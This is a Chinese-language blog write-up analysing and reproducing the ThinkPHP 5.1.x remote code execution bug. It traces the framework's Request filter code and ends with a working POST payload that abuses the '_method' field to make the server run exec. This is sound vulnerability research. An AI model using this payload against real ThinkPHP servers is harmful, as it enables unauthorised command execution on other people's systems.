date: 2020-01-30
categories:
- cve复现
tags:
- cve复现
title: ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析
---
# ThinkPHP 5.1.x-5.2.x全版本RCE 漏洞分析



## 影响范围

5.1.x-5.1.32  5.2.x(这个还没去看)



## 漏洞复现

补丁: https://github.com/top-think/framework/commit/2454cebcdb6c12b352ac0acd4a4e6b25b31982e6 

测试环境 5.1.29

**入口处关闭报错** 

![image283](https://i.loli.net/2020/01/30/2x4QWZYgmXjqo8r.png)



和5.0.x版本的漏洞有着相似之处,都是`$this->method`方法未过滤导致的任意变量覆盖,从而导致命令执行

通过`$_POST['_method']=xxxxx`来进行任意变量覆盖

我们选择覆盖`$this->filter`,翻找Request类中的函数发现还是`Request::input`处可以命令执行,下断点可以看到调用堆栈



![image527](https://i.loli.net/2020/01/30/dVyPeZHbYM3TFq7.png)



我们从`Request::param`处开始分析

```php
public function param($name = '', $default = null, $filter = '')
    {
        if (!$this->mergeParam) {
            $method = $this->method(true);

            // 自动获取请求变量
            switch ($method) {
                case 'POST':
                    $vars = $this->post(false);
                    break;
                case 'PUT':
                case 'DELETE':
                case 'PATCH':
                    $vars = $this->put(false);
                    break;
                default:
                    $vars = [];
            }

            // 当前请求参数和URL地址中的参数合并
            $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));

            $this->mergeParam = true;
        }

        ...
    }
```

因为是POST请求所以会进入POST分支,跟进`Request::post`

```php
	public function post($name = '', $default = null, $filter = '')
    {
        if (empty($this->post)) {
            $this->post = !empty($_POST) ? $_POST : $this->getInputData($this->input);
        }

        return $this->input($this->post, $name, $default, $filter);
    }
```

接着便会调用`Request::input`,其中`$this->post`和`$filter`可控

跟进`Request::input`

```php
public function input($data = [], $name = '', $default = null, $filter = '')
    {
		...

        // 解析过滤器
        $filter = $this->getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, 'filterValue'], $filter);
            reset($data);
        } else {
            $this->filterValue($data, $name, $filter);
        }

       ...
    }
```

因为`$data`是数组(`$_POST`),调用`array_walk_recursive($data, [$this, 'filterValue'], $filter);`

对`$data`中所有值调用`Request::filterValue`

跟进去

```php
private function filterValue(&$value, $key, $filters)
    {
        $default = array_pop($filters);

        foreach ($filters as $filter) {
            if (is_callable($filter)) {
                // 调用函数或者方法过滤
                $value = call_user_func($filter, $value);
            } elseif (is_scalar($value)) {
                if (false !== strpos($filter, '/')) {
                    // 正则过滤
                    if (!preg_match($filter, $value)) {
                        // 匹配不成功返回默认值
                        $value = $default;
                        break;
                    }
                } elseif (!empty($filter)) {
                    // filter函数不存在时, 则使用filter_var进行过滤
                    // filter为非整形值时, 调用filter_id取得过滤id
                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
                    if (false === $value) {
                        $value = $default;
                        break;
                    }
                }
            }
        }

        return $value;
    }
```

阅读代码可知,filterValue会对`$_POST`中所有值调用`$filter`中每一个可以调用的函数或方法

且`$filter`=`$_POST`

因此有



```
http://127.0.0.1/public/
POST:  var1=exec&var2=calc.exe&_method=filter
```



## 补丁分析

对method进行了白名单限制

## 参考

 [https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/](https://www.smi1e.top/thinkphp-5-1-x5-2-x全版本-rce-漏洞分析/) 